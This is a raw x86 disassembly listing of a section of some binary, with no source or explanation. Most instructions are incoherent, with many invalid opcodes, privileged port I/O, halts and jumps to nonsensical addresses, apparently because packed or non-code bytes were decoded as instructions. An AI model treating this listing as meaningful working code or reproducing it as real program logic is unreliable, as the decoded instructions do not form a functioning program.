  409264:	lods   al,BYTE PTR ds:[esi]
  409265:	add    dh,ch
  409267:	cwde   
  409268:	lea    esp,[edx-0x3d]
  40926b:	jo     0x409235
  40926d:	je     0x40928e
  40926f:	daa    
  409270:	xchg   ebx,eax
  409271:	outs   dx,BYTE PTR ds:[esi]
  409272:	rcr    BYTE PTR [esi],0xb7
  409275:	and    eax,0x47f38355
  40927a:	out    dx,al
  40927b:	inc    BYTE PTR [esi+0x63deb3aa]
  409281:	into   
  409282:	lds    ecx,FWORD PTR [ebp+ecx*1+0x36fa6e0f]
  409289:	sub    BYTE PTR [ebp+0x51],ch
  40928c:	shl    BYTE PTR [ecx],0x9b
  40928f:	imul   ebp,DWORD PTR [ebx+0x31],0x8e7ce01
  409296:	mov    ecx,0xcfe8697c
  40929b:	test   ebx,0x85fe2208
  4092a1:	mov    dh,0xd0
  4092a3:	cld    
  4092a4:	lahf   
  4092a5:	lahf   
  4092a6:	mov    edx,0x3c591331
  4092ab:	or     BYTE PTR [ebx-0x236446fb],0x5d
  4092b2:	inc    edx
  4092b3:	mul    bl
  4092b5:	mov    ebp,0xb77571f5
  4092ba:	push   edi
  4092bb:	jge    0x4092b9
  4092bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092be:	jnp    0x409279
  4092c0:	push   cs
  4092c1:	pop    esi
  4092c2:	imul   ecx,DWORD PTR [eax],0xffffffea
  4092c5:	and    ebp,edx
  4092c7:	mov    eax,0x31acf876
  4092cc:	mov    ?,WORD PTR [edx-0xa]
  4092cf:	sub    DWORD PTR [edi+ecx*2-0x58],0xffffff95
  4092d4:	pop    edi
  4092d5:	jo     0x40931e
  4092d7:	aad    0x7c
  4092d9:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092db:	out    0x31,eax
  4092dd:	rol    ebp,0x3b
  4092e0:	jb     0x40934c
  4092e2:	scas   eax,DWORD PTR es:[edi]
  4092e3:	aad    0x42
  4092e5:	mov    esi,0x29dff652
  4092ea:	xor    al,0x2f
  4092ec:	or     DWORD PTR [ebp-0x8b27300],ecx
  4092f2:	xor    ebp,DWORD PTR [edx-0x5c]
  4092f5:	(bad)  
  4092f6:	bound  ecx,QWORD PTR [ebp+0x32]
  4092f9:	(bad)  
  4092fa:	jae    0x4092a2
  4092fc:	jl     0x409332
  4092fe:	fwait
  4092ff:	sbb    al,0x3f
  409301:	or     esp,DWORD PTR [edx+0x0]
  409304:	sub    al,0x90
  409306:	xor    esi,DWORD PTR [ecx+0x30]
  409309:	pop    ss
  40930a:	hlt    
  40930b:	aad    0x67
  40930d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40930e:	jp     0x409387
  409310:	sub    edx,ebx
  409312:	mov    dl,0xe7
  409314:	push   es
  409315:	mov    esi,0x958e1943
  40931a:	out    0xa7,al
  40931c:	adc    eax,edx
  40931e:	push   ebp
  40931f:	inc    ebp
  409320:	jle    0x409338
  409322:	hlt    
  409323:	mov    bh,0xaf
  409325:	ficomp WORD PTR [ebx+0x3026355c]
  40932b:	cli    
  40932c:	data16 jle 0x409389
  40932f:	loope  0x409320
  409331:	scas   eax,DWORD PTR es:[edi]
  409332:	inc    ebx
  409333:	aam    0x70
  409335:	adc    BYTE PTR [ecx+0x528733dc],dl
  40933b:	es adc esp,0x5e
  40933f:	jle    0x4093aa
  409341:	push   ebx
  409342:	xchg   DWORD PTR [ebx-0x58],esi
  409345:	stos   BYTE PTR es:[edi],al
  409346:	inc    ecx
  409347:	pop    ecx
  409348:	dec    esi
  409349:	xchg   ebx,eax
  40934a:	fild   QWORD PTR [edi+0x52]
  40934d:	scas   eax,DWORD PTR es:[edi]
  40934e:	mov    esi,0xbf7c26be
  409353:	jle    0x4092e8
  409355:	(bad)  
  409356:	dec    BYTE PTR [edi+0x62]
  409359:	pop    bp
  40935b:	fs es xlat BYTE PTR ds:[ebx]
  40935f:	pop    edi
  409360:	outs   dx,BYTE PTR ds:[esi]
  409361:	xor    DWORD PTR [edi-0x2663ce08],eax
  409367:	je     0x409314
  409369:	stc    
  40936a:	in     eax,dx
  40936b:	sbb    DWORD PTR [eax+0x73],eax
  40936e:	outs   dx,DWORD PTR ds:[esi]
  40936f:	lock cld 
  409371:	into   
  409372:	cdq    
  409373:	lea    edi,[edi]
  409375:	mov    dh,0x23
  409377:	loope  0x40936c
  409379:	add    eax,0x75254c73
  40937e:	inc    eax
  40937f:	add    edx,DWORD PTR [esi-0x27]
  409382:	(bad)  
  409383:	popa   
  409384:	push   esi
  409385:	aaa    
  409386:	mov    esi,0x1e9c3ab2
  40938b:	cli    
  40938c:	and    al,0x4
  40938e:	std    
  40938f:	(bad)  
  409391:	and    eax,0xb5d2a4bb
  409396:	jb     0x40934b
  409398:	std    
  409399:	xchg   ecx,eax
  40939a:	std    
  40939b:	mov    es,WORD PTR [ebp+0x2c8bc061]
  4093a1:	daa    
  4093a2:	or     dl,BYTE PTR [edi]
  4093a4:	ss jmp 0x409395
  4093a7:	mov    ds:0x6f9035f7,al
  4093ac:	jns    0x409419
  4093ae:	add    al,0xd9
  4093b0:	push   ss
  4093b1:	xor    al,0x91
  4093b3:	jb     0x40935a
  4093b5:	je     0x4093e8
  4093b7:	adc    DWORD PTR [esi-0x6e1fe872],ecx
  4093bd:	std    
  4093be:	test   eax,0x41a537e2
  4093c3:	pop    esi
  4093c4:	mov    BYTE PTR [eax],dl
  4093c6:	scas   al,BYTE PTR es:[edi]
  4093c7:	cwde   
  4093c8:	(bad)  
  4093c9:	mov    eax,ds:0xe724bf92
  4093ce:	dec    ebp
  4093cf:	jg     0x4093ba
  4093d1:	or     DWORD PTR [ebp-0x14],ebp
  4093d4:	ja     0x4093c5
  4093d6:	stos   BYTE PTR es:[edi],al
  4093d7:	ret    
  4093d8:	lods   eax,DWORD PTR ds:[esi]
  4093d9:	cmp    DWORD PTR [edi-0x7f61eb0e],ebp
  4093df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093e0:	or     bl,BYTE PTR [eax+edx*8]
  4093e3:	dec    edx
  4093e4:	psrlw  mm3,QWORD PTR [edi]
  4093e7:	in     eax,dx
  4093e8:	fwait
  4093e9:	and    al,0x42
  4093eb:	fwait
  4093ec:	cdq    
  4093ed:	jbe    0x409414
  4093ef:	jmp    FWORD PTR [eax+edx*4]
  4093f2:	pop    ebx
  4093f3:	adc    BYTE PTR [esi-0x71],ah
  4093f6:	ss mov ah,0xbf
  4093f9:	test   eax,0x9199e6d9
  4093fe:	rcl    ah,0xd8
  409401:	or     DWORD PTR [eax-0x72],0x7b
  409405:	call   0x5723:0x83254557
  40940c:	xor    BYTE PTR [esi+0x76],dh
  40940f:	lahf   
  409410:	mov    dl,BYTE PTR [ecx]
  409412:	imul   DWORD PTR [edi]
  409414:	add    DWORD PTR [ebx-0x141e16e3],ebp
  40941a:	aas    
  40941b:	pop    esi
  40941c:	xor    BYTE PTR [edx],dl
  40941e:	xchg   ebx,eax
  40941f:	aas    
  409420:	fild   QWORD PTR [eax+edx*8+0x77]
  409424:	or     eax,DWORD PTR [esi+0x53]
  409427:	test   DWORD PTR [edx-0x5be56c1c],ebp
  40942d:	cmp    al,0x85
  40942f:	sti    
  409430:	inc    ecx
  409431:	mov    BYTE PTR [esi-0x4a],0xfa
  409435:	pop    ebx
  409436:	pushf  
  409437:	dec    esi
  409438:	ror    DWORD PTR [ebp+ebp*8+0x745d954],1
  40943f:	adc    esi,edx
  409441:	jle    0x40942e
  409443:	xor    bh,BYTE PTR [ebp+ecx*1-0x16]
  409447:	add    edi,0x2f
  40944a:	pop    ebx
  40944b:	pop    es
  40944c:	pop    ebx
  40944d:	and    esi,ebx
  40944f:	inc    edx
  409450:	dec    ebx
  409451:	dec    ebp
  409452:	cdq    
  409453:	pop    edx
  409454:	jb     0x4094d2
  409456:	outs   dx,DWORD PTR ds:[esi]
  409457:	repnz mov ch,0x57
  40945a:	mov    bh,0xab
  40945c:	mov    edx,0x5abfeeb3
  409461:	sbb    DWORD PTR [esi+ebp*2-0x66da860],ebp
  409468:	rcl    DWORD PTR cs:[esi],0x42
  40946c:	ds mov ch,0x5b
  40946f:	push   ss
  409470:	pop    ebx
  409471:	or     ecx,DWORD PTR [ebx]
  409473:	jnp    0x4094a3
  409475:	jg     0x409460
  409477:	rcl    BYTE PTR [ebp+0x46793909],cl
  40947d:	sub    ebx,DWORD PTR [eax-0x21]
  409480:	aas    
  409481:	push   0x67
  409483:	push   esi
  409484:	cld    
  409485:	push   ebx
  409486:	inc    esi
  409487:	jb     0x4094c8
  409489:	pop    esp
  40948a:	jg     0x40947d
  40948c:	in     eax,dx
  40948d:	arpl   WORD PTR [ecx+0x68c7fb9c],dx
  409493:	arpl   WORD PTR [edi],di
  409495:	out    dx,eax
  409496:	cmc    
  409497:	nop
  409498:	adc    DWORD PTR [esi],esi
  40949a:	mov    ds:0xc7860116,eax
  40949f:	push   edx
  4094a0:	dec    BYTE PTR [edi]
  4094a2:	jmp    0xcf17bd05
  4094a7:	sub    ah,BYTE PTR [ecx]
  4094a9:	test   al,0xee
  4094ac:	(bad)  
  4094ad:	sbb    dh,BYTE PTR [edx+0x6848f1fd]
  4094b3:	sbb    al,0xc5
  4094b5:	rol    DWORD PTR [edi+edx*4-0x5e],1
  4094b9:	adc    ah,BYTE PTR [eax-0x50bba9b5]
  4094bf:	sub    eax,0x6d053fcd
  4094c4:	mov    ds:0x99c7fdb6,eax
  4094c9:	inc    ecx
  4094ca:	fbstp  TBYTE PTR [ebp-0x21f48588]
  4094d0:	lahf   
  4094d1:	(bad)  
  4094d2:	mov    ds:0xd20f1d18,eax
  4094d7:	mov    ah,0xb5
  4094d9:	or     edi,DWORD PTR [esi]
  4094db:	xchg   BYTE PTR [edi+0x75379838],dh
  4094e1:	(bad)  [edx-0x35e8e5e0]
  4094e7:	dec    ebp
  4094e8:	sti    
  4094e9:	sub    DWORD PTR [esi],esp
  4094eb:	push   ss
  4094ec:	push   0x4
  4094ee:	sub    ebx,eax
  4094f0:	cmp    edi,DWORD PTR [ecx]
  4094f2:	fisubr DWORD PTR [ecx+0x7a]
  4094f5:	add    al,0xb1
  4094f7:	iret   
  4094f8:	xor    DWORD PTR [ecx+0x6afc8fa4],ecx
  4094fe:	mov    BYTE PTR [ebx-0x59604f82],cl
  409504:	add    eax,0x13f70801
  409509:	or     bh,BYTE PTR [esi-0x1f823257]
  40950f:	stc    
  409510:	xlat   BYTE PTR ds:[ebx]
  409511:	mov    ch,BYTE PTR es:[edi]
  409514:	mov    ds:0xeefebfe5,al
  409519:	push   es
  40951a:	and    eax,0xd6c4ae22
  40951f:	cmp    BYTE PTR [esi-0x5741378d],bh
  409525:	fs stos BYTE PTR es:[edi],al
  409527:	addr16 das 
  409529:	(bad)  
  40952a:	out    0x39,al
  40952c:	mov    cl,0x41
  40952e:	js     0x409543
  409530:	xchg   edx,eax
  409531:	mov    ?,WORD PTR [ebx+0x2e]
  409534:	pop    ebx
  409535:	push   0xfffffff4
  409537:	dec    DWORD PTR [esi-0x68f318dc]
  40953d:	ftst   
  40953f:	fldcw  WORD PTR [ebx+esi*4-0x2e]
  409543:	shl    edi,1
  409545:	push   ss
  409546:	sbb    ah,BYTE PTR [eax+0xae0ff40]
  40954c:	pop    ds
  40954d:	cs cs out dx,al
  409550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409551:	outs   dx,DWORD PTR ds:[esi]
  409552:	xchg   esi,eax
  409553:	aaa    
  409554:	push   es
  409555:	jns    0x4095d4
  409557:	xor    BYTE PTR [ecx+0x7ce6a964],ch
  40955d:	jl     0x409551
  40955f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409560:	cmp    BYTE PTR [edx+eiz*4-0x7a3574b2],ch
  409567:	inc    esp
  409568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409569:	stos   BYTE PTR es:[edi],al
  40956a:	mov    dl,0x7c
  40956c:	push   eax
  40956d:	lock shl BYTE PTR [esi-0x3d],cl
  409571:	je     0x4095f0
  409573:	rcr    ch,0x45
  409576:	aaa    
  409577:	fstp   DWORD PTR [eax-0x52dae329]
  40957d:	mov    esi,0xb17d5120
  409582:	xor    al,0x56
  409584:	dec    ebx
  409585:	cmp    ah,al
  409587:	retf   0xbff
  40958a:	ja     0x4095d2
  40958c:	pop    ebx
  40958d:	pop    edx
  40958e:	jmp    0x40951b
  409590:	mov    dl,0x7d
  409592:	sub    edx,DWORD PTR [esi-0x25]
  409595:	mov    ds:0x1608312,ax
  40959b:	gs scas al,BYTE PTR es:[edi]
  40959d:	or     BYTE PTR [esi+0x7c87a91c],dl
  4095a3:	into   
  4095a4:	add    al,0xaf
  4095a6:	jecxz  0x409585
  4095a8:	(bad)  
  4095a9:	ja     0x409599
  4095ab:	in     al,0xe8
  4095ad:	xchg   esi,edi
  4095af:	mov    cl,BYTE PTR [edi+edx*8-0x748d0616]
  4095b6:	dec    BYTE PTR [ecx]
  4095b8:	cli    
  4095b9:	mov    al,ds:0x861c8dbc
  4095be:	add    cl,BYTE PTR [esi+0x54]
  4095c1:	test   BYTE PTR [eax+0x4151c05b],al
  4095c7:	(bad)  
  4095c8:	aas    
  4095c9:	sub    ebp,edi
  4095cb:	arpl   sp,bp
  4095cd:	or     BYTE PTR [ebp-0x23],ch
  4095d0:	stos   BYTE PTR es:[edi],al
  4095d1:	call   0x8d4a:0xd45c9568
  4095d8:	into   
  4095d9:	inc    esi
  4095da:	and    edi,DWORD PTR [edx+0x74]
  4095dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095de:	mov    ebx,0x229fe6a2
  4095e3:	shl    dl,1
  4095e5:	sub    edx,DWORD PTR [ecx]
  4095e7:	xchg   esi,edi
  4095e9:	leave  
  4095ea:	jmp    0x60874b52
  4095ef:	xchg   DWORD PTR [ebx],esi
  4095f1:	xchg   DWORD PTR [esi+0x72],ebp
  4095f4:	dec    eax
  4095f5:	mov    al,0xea
  4095f7:	(bad)  
  4095f8:	ret    
  4095f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095fa:	int    0xbb
  4095fc:	test   dl,ch
  4095fe:	inc    esi
  4095ff:	fldenv [ebx+0x1a]
  409602:	mov    WORD PTR [ecx+0x143f98e6],fs
  409608:	xchg   esi,eax
  409609:	and    al,0x8d
  40960b:	icebp  
  40960c:	shl    DWORD PTR [eax+0x7cb6d698],cl
  409612:	lahf   
  409613:	(bad)  
  409614:	clc    
  409615:	xchg   esi,eax
  409616:	fcomp  DWORD PTR [edx]
  409618:	rcr    DWORD PTR [edi-0x1cc8cd9c],cl
  40961e:	xor    eax,0x9d5240f6
  409623:	sbb    cl,BYTE PTR [ebx]
  409625:	je     0x409670
  409627:	dec    eax
  409628:	ins    BYTE PTR es:[edi],dx
  409629:	ins    BYTE PTR es:[edi],dx
  40962a:	add    BYTE PTR [edx+0x57acf267],ch
  409630:	jnp    0x4096a2
  409632:	adc    bl,BYTE PTR [ecx]
  409634:	sbb    esp,DWORD PTR [ebx-0x12]
  409637:	(bad)  
  409638:	in     al,dx
  409639:	outs   dx,DWORD PTR ds:[esi]
  40963a:	cmp    al,BYTE PTR [eax+0x6b]
  40963d:	sbb    DWORD PTR [esi+0x48],eax
  409640:	sub    DWORD PTR [esi-0x25],esp
  409643:	mov    bl,cl
  409645:	(bad)  
  409647:	rcr    BYTE PTR [edi+0x155acf2e],cl
  40964d:	mov    cl,0x7
  40964f:	push   cs
  409650:	hlt    
  409651:	sti    
  409652:	xor    BYTE PTR [ebx-0x80],0x31
  409656:	push   edi
  409657:	dec    ebp
  409658:	push   0x64b9eef4
  40965d:	pop    edi
  40965e:	push   0xffffffd8
  409660:	cmp    ebp,ecx
  409662:	jp     0x409687
  409664:	push   0xffffff99
  409666:	xchg   ecx,eax
  409667:	cld    
  409668:	rep lods eax,DWORD PTR ds:[esi]
  40966a:	push   0x39
  40966c:	sbb    edi,DWORD PTR [esi+0x50]
  40966f:	xchg   edi,eax
  409670:	mov    ds:0x1bf25d58,al
  409675:	cmp    dl,BYTE PTR [ecx-0x4e]
  409678:	xor    eax,0xc21fd96a
  40967d:	pop    edi
  40967e:	inc    edx
  40967f:	call   0xb72c6c33
  409684:	(bad)  
  409685:	sbb    al,0xcf
  409687:	lods   eax,DWORD PTR ds:[esi]
  409688:	jnp    0x40961f
  40968a:	les    ebx,FWORD PTR [ebp-0x21]
  40968d:	daa    
  40968e:	mov    ds:0x7549c1e0,al
  409693:	lods   al,BYTE PTR ds:[esi]
  409694:	adc    eax,0x13c950ab
  409699:	xchg   esi,eax
  40969a:	xchg   ebp,eax
  40969b:	out    dx,eax
  40969c:	push   edi
  40969d:	add    ebx,DWORD PTR [edi-0x7ce7e2ef]
  4096a3:	(bad)  
  4096a4:	fs xor esi,ecx
  4096a7:	pop    edi
  4096a8:	(bad)  
  4096a9:	lods   al,BYTE PTR fs:[esi]
  4096ab:	dec    esi
  4096ac:	push   es
  4096ad:	and    ah,0x9e
  4096b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096b1:	aad    0xa3
  4096b3:	xchg   edx,eax
  4096b4:	xor    BYTE PTR [ecx-0x3e81a1c4],0xd
  4096bb:	pushf  
  4096bc:	fcom   QWORD PTR [eax]
  4096be:	or     ecx,esp
  4096c0:	or     DWORD PTR [eax-0x24080c87],ebp
  4096c6:	mov    ds:0x98618785,al
  4096cb:	adc    DWORD PTR [esp+edx*1+0x5a],0xbad352de
  4096d3:	or     BYTE PTR [esp+ecx*2],bl
  4096d6:	adc    al,al
  4096d8:	push   cs
  4096d9:	sub    BYTE PTR [edi-0x30],al
  4096dc:	repnz inc ebx
  4096de:	add    DWORD PTR [edi],eax
  4096e0:	dec    ecx
  4096e1:	in     eax,dx
  4096e2:	xchg   ebp,eax
  4096e3:	mov    al,0xe
  4096e5:	and    dh,BYTE PTR [ecx]
  4096e7:	adc    eax,0x725de3a
  4096ec:	fs into 
  4096ee:	aas    
  4096ef:	xchg   ecx,eax
  4096f0:	xchg   edi,eax
  4096f1:	sbb    ebx,DWORD PTR [ebx+edx*4]
  4096f4:	pop    es
  4096f5:	mov    ebx,0x4d1ff819
  4096fa:	sar    esp,cl
  4096fc:	ins    BYTE PTR es:[edi],dx
  4096fd:	cs std 
  4096ff:	mov    ebx,0x58c52554
  409704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409705:	sub    dl,BYTE PTR [esi]
  409707:	inc    edx
  409708:	cmp    al,0x42
  40970a:	mov    dl,0x5a
  40970c:	jb     0x4096c9
  40970e:	call   DWORD PTR [edx-0xd]
  409711:	xchg   BYTE PTR [esi-0x7d],dh
  409714:	das    
  409715:	in     eax,0xe9
  409717:	sahf   
  409718:	mov    dl,0x5e
  40971a:	xor    DWORD PTR [eax],edi
  40971c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40971d:	adc    ebx,0xffffffc5
  409720:	cs ins DWORD PTR es:[edi],dx
  409722:	sbb    ecx,DWORD PTR ds:0x9f03d09a
  409728:	lds    edx,FWORD PTR ds:0xb42510ae
  40972e:	xchg   esp,eax
  40972f:	xchg   DWORD PTR [ecx],eax
  409731:	outs   dx,DWORD PTR ds:[esi]
  409732:	mov    edi,0xfc6b8aef
  409737:	xor    eax,DWORD PTR [ebx-0x16ad3fc6]
  40973d:	mov    dh,0xad
  40973f:	in     al,0x62
  409741:	ins    DWORD PTR es:[di],dx
  409743:	(bad)  
  409744:	sbb    ecx,DWORD PTR [edi]
  409746:	lahf   
  409747:	lods   al,BYTE PTR ds:[esi]
  409748:	dec    ebx
  409749:	repz cmp ch,BYTE PTR [edx-0x20]
  40974d:	push   ebx
  40974e:	xor    BYTE PTR ds:0x5e78f680,bh
  409754:	(bad)  
  409756:	pop    ss
  409757:	sti    
  409758:	imul   ebp,edx,0x3b32b75b
  40975e:	push   ebp
  40975f:	and    BYTE PTR [eax+eax*8+0x60],ah
  409763:	je     0x40972f
  409765:	adc    BYTE PTR [ebp+0x5f],0x80
  409769:	test   eax,0xb78e6801
  40976e:	and    al,dh
  409770:	or     DWORD PTR [edi-0x77d94aee],esp
  409776:	stos   BYTE PTR es:[edi],al
  409777:	adc    eax,0xf6f306b2
  40977c:	pusha  
  40977d:	xor    BYTE PTR [edi],ah
  40977f:	push   esp
  409780:	fild   WORD PTR ds:0xc66c193a
  409786:	jp     0x4097d4
  409788:	mov    eax,ds:0xba97fa66
  40978d:	xchg   ecx,eax
  40978e:	je     0x409794
  409790:	mov    ecx,0xa86ff5d1
  409795:	adc    edi,DWORD PTR ss:0x3706250a
  40979c:	aaa    
  40979d:	push   edi
  40979e:	push   ss
  40979f:	aas    
  4097a0:	xchg   ecx,eax
  4097a1:	push   ebx
  4097a2:	push   edi
  4097a3:	pop    ss
  4097a4:	pop    edi
  4097a5:	sar    BYTE PTR [eax],1
  4097a7:	setno  al
  4097aa:	ror    BYTE PTR [esi-0x45],cl
  4097ad:	(bad)  
  4097ae:	clc    
  4097af:	leave  
  4097b0:	xor    eax,0x38cf2942
  4097b5:	push   0x9dc46d
  4097ba:	or     ebp,DWORD PTR [edi-0x5e]
  4097bd:	scas   al,BYTE PTR es:[edi]
  4097be:	das    
  4097bf:	ss popa 
  4097c1:	(bad)  
  4097c2:	mov    dl,0xc
  4097c4:	pop    ss
  4097c5:	mov    eax,ds:0x5e1ca961
  4097ca:	test   dh,al
  4097cc:	out    dx,al
  4097cd:	jbe    0x409848
  4097cf:	lods   al,BYTE PTR ds:[esi]
  4097d0:	mov    eax,DWORD PTR [eax+0x4f]
  4097d3:	inc    edi
  4097d4:	inc    esi
  4097d5:	rcl    cl,1
  4097d7:	and    DWORD PTR [edi],0x4050f2e7
  4097dd:	repz xor ah,bl
  4097e0:	adc    esp,esi
  4097e2:	cwde   
  4097e3:	fld    DWORD PTR [esi]
  4097e5:	btr    DWORD PTR [ebx],ebp
  4097e8:	(bad)  
  4097e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097ea:	shl    BYTE PTR [ebx-0x32],1
  4097ed:	fcom   st(4)
  4097ef:	(bad)  
  4097f0:	fneni(8087 only) 
  4097f2:	adc    DWORD PTR [edx-0x64],0x69c3a8c3
  4097f9:	stos   DWORD PTR es:[edi],eax
  4097fa:	adc    bh,BYTE PTR [ebx+0x1a]
  4097fd:	out    dx,al
  4097fe:	adc    al,0x99
  409800:	aas    
  409801:	inc    ebx
  409802:	inc    ecx
  409803:	inc    eax
  409804:	xchg   ecx,eax
  409805:	pop    ecx
  409806:	sub    DWORD PTR [edx-0x80],0x14
  40980a:	mov    al,BYTE PTR [edi+0x1688b549]
  409810:	dec    eax
  409811:	lods   eax,DWORD PTR ds:[esi]
  409812:	(bad)  
  409813:	sbb    eax,0x12ef4c12
  409818:	add    eax,0x2261f5c8
  40981d:	call   0x9f7cee57
  409822:	call   0x131a:0x9febac55
  409829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40982a:	pushf  
  40982b:	sbb    DWORD PTR [edx+0x1896a991],0xffffffed
  409832:	cli    
  409833:	mov    edi,0x42af1575
  409838:	fst    st(1)
  40983a:	sub    edx,esp
  40983c:	or     eax,0x83acd339
  409841:	jmp    0x7af2:0x92fc2a5
  409848:	ins    BYTE PTR es:[edi],dx
  409849:	test   BYTE PTR [eax],dh
  40984b:	dec    ebx
  40984c:	out    0x53,al
  40984e:	sub    eax,0x837a4910
  409853:	xor    ch,BYTE PTR ds:0xf95e3200
  409859:	ja     0x409826
  40985b:	or     eax,0x3da40ae6
  409860:	xchg   ebp,eax
  409861:	xor    edx,eax
  409863:	dec    edi
  409864:	stos   BYTE PTR es:[edi],al
  409865:	mov    dl,0xda
  409867:	bound  esi,QWORD PTR ds:0x314c20f1
  40986d:	cwde   
  40986e:	ins    DWORD PTR es:[edi],dx
  40986f:	adc    al,0x16
  409871:	sub    eax,edx
  409873:	and    al,0x8f
  409875:	loope  0x409805
  409877:	rcl    cl,cl
  409879:	aad    0xfb
  40987b:	ror    DWORD PTR [edx+eiz*2+0x1e],1
  40987f:	(bad)  
  409880:	stos   BYTE PTR es:[edi],al
  409881:	fcmovbe st,st(7)
  409883:	out    dx,eax
  409884:	pop    ebp
  409885:	inc    ebp
  409886:	js     0x409872
  409888:	adc    DWORD PTR [edx-0x72],esp
  40988b:	imul   ch
  40988d:	lods   al,BYTE PTR ds:[esi]
  40988e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40988f:	es std 
  409891:	arpl   bp,sp
  409893:	mov    ch,0xda
  409895:	int3   
  409896:	sbb    al,0xde
  409898:	xor    ebp,DWORD PTR [esp+ebp*8-0x51c53944]
  40989f:	mov    bh,0x5b
  4098a1:	retf   
  4098a2:	ds mov cl,0x9e
  4098a5:	pusha  
  4098a6:	jbe    0x4098c0
  4098a8:	push   edx
  4098a9:	out    0x93,al
  4098ab:	adc    edx,DWORD PTR [ebx-0x2736b0e1]
  4098b1:	rcr    BYTE PTR [esi+0x486e06a8],cl
  4098b7:	inc    ebp
  4098b8:	xchg   edx,eax
  4098b9:	fsubr  QWORD PTR [edx-0x1a6a524e]
  4098bf:	arpl   WORD PTR [edi],sp
  4098c1:	shl    DWORD PTR [esp+eiz*4+0x2a],1
  4098c5:	retf   0x4dc7
  4098c8:	rcl    DWORD PTR [ebp-0x2ee73662],0xd
  4098cf:	mov    ds:0xf25d398b,eax
  4098d4:	jno    0x409865
  4098d6:	bound  ebp,QWORD PTR [ecx-0xf]
  4098d9:	div    eax
  4098db:	mul    BYTE PTR [esi]
  4098dd:	jl     0x40991e
  4098df:	sbb    DWORD PTR [ecx-0x112bf003],ebp
  4098e5:	xor    eax,ebp
  4098e7:	adc    eax,0x1d07589e
  4098ec:	ins    BYTE PTR es:[edi],dx
  4098ed:	inc    esi
  4098ee:	dec    esp
  4098ef:	adc    ax,0xd19b
  4098f3:	retf   0x8d13
  4098f6:	mov    bl,0x54
  4098f8:	into   
  4098f9:	push   0xffffffbf
  4098fb:	or     DWORD PTR [edx+0x30a6c5a],esp
  409901:	mov    al,ds:0x35787779
  409906:	push   edi
  409907:	stos   BYTE PTR es:[edi],al
  409908:	jmp    0x40994f
  40990a:	mov    ds:0xe2a104af,al
  40990f:	mov    WORD PTR [eax-0x13],?
  409912:	int3   
  409913:	es cs arpl si,bx
  409917:	lods   al,BYTE PTR ds:[esi]
  409918:	jle    0x4098e8
  40991a:	push   edi
  40991b:	loop   0x409934
  40991d:	push   ecx
  40991e:	pop    edx
  40991f:	mov    ds:0x9116b7ad,al
  409924:	pop    ebp
  409925:	out    dx,eax
  409926:	xchg   edx,eax
  409927:	sbb    eax,0xe6a87d2e
  40992c:	mov    WORD PTR [eax],fs
  40992e:	loop   0x4098e6
  409930:	add    al,BYTE PTR [edi+0x66]
  409933:	pop    esi
  409934:	or     edi,eax
  409936:	rcl    DWORD PTR [eax+edi*1-0x14],0xea
  40993b:	hlt    
  40993c:	mov    dh,0x2f
  40993e:	aam    0xee
  409940:	sub    DWORD PTR [ebp-0x3d],0x5ad7aa2f
  409947:	iret   
  409948:	mov    al,0x3f
  40994a:	jecxz  0x409913
  40994c:	fs push ecx
  40994e:	add    DWORD PTR [eax-0x4d],esi
  409951:	mov    esi,0x1aabf7f3
  409956:	adc    ecx,DWORD PTR [esi+edi*8-0x25d9badf]
  40995d:	es xchg ecx,eax
  40995f:	fistp  QWORD PTR [edx-0x45]
  409962:	pushf  
  409963:	mov    dh,BYTE PTR [ecx+edi*4-0x23b99a69]
  40996a:	fwait
  40996b:	cmc    
  40996c:	sub    DWORD PTR [ecx],0xa895a47c
  409972:	test   DWORD PTR [esi+0x2d6b1f8f],ebx
  409978:	push   ecx
  409979:	lods   al,BYTE PTR ds:[esi]
  40997a:	sete   BYTE PTR es:[ecx+edx*8-0x25]
  409980:	imul   BYTE PTR [ebp-0x4a]
  409983:	ins    DWORD PTR es:[edi],dx
  409984:	lea    ecx,[edx]
  409986:	lods   al,BYTE PTR ds:[esi]
  409987:	scas   eax,DWORD PTR es:[edi]
  409988:	stc    
  409989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40998a:	das    
  40998b:	hlt    
  40998c:	xor    BYTE PTR [ecx+0x7270d860],cl
  409992:	pop    edx
  409993:	xchg   esi,eax
  409994:	mov    DWORD PTR [ebx],ebx
  409996:	mov    eax,ds:0xe3bd1f0
  40999b:	mov    ecx,0xa506ea0f
  4099a0:	or     al,0x1d
  4099a2:	mov    ebx,0xb7a513c5
  4099a7:	mov    bh,0xe7
  4099a9:	(bad)  
  4099aa:	sbb    DWORD PTR [edx+eiz*4-0x1d3199a6],eax
  4099b1:	fbld   TBYTE PTR [esi]
  4099b3:	mov    fs,WORD PTR [edx+ebx*2]
  4099b6:	xchg   BYTE PTR [ecx+0x1069b644],dh
  4099bc:	mov    ch,ah
  4099be:	dec    eax
  4099bf:	and    BYTE PTR [esi+0x63b1bedb],al
  4099c5:	cld    
  4099c6:	add    bl,dl
  4099c8:	or     eax,0xe02ddd50
  4099cd:	sub    BYTE PTR [esi],ch
  4099cf:	dec    edi
  4099d0:	or     eax,0xab529033
  4099d5:	retf   
  4099d6:	cmp    dh,BYTE PTR [ebp+0x217079e3]
  4099dc:	inc    ebp
  4099dd:	cmp    dh,ch
  4099df:	dec    ecx
  4099e0:	cmp    edi,0x8
  4099e3:	scas   al,BYTE PTR es:[edi]
  4099e4:	mov    BYTE PTR [edi+eiz*2+0x1e68632],dh
  4099eb:	cs bnd jp 0x409a00
  4099ef:	cmp    esp,esi
  4099f1:	aam    0x2b
  4099f3:	lea    ebx,[eax-0x9]
  4099f6:	mov    eax,0xec1f4c3e
